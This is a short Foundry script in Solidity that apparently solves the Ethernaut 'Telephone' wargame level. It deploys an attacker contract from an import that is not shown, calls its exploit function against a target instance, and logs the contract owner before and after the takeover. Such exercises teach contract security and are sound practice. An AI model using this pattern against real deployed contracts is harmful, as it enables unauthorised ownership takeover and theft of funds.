// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/04_telephone.sol";
import "contracts/04_telephone.sol";

contract AttackerTelephoneScript is Script {
    Telephone telephone = Telephone(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        AttackerTelephone attackerTelephone = new AttackerTelephone();

        console.log("Current Owner is : ", telephone.owner());
        attackerTelephone.exploit(address(telephone));
        console.log("New Owner is : ", telephone.owner());

        vm.stopBroadcast();
    }
}
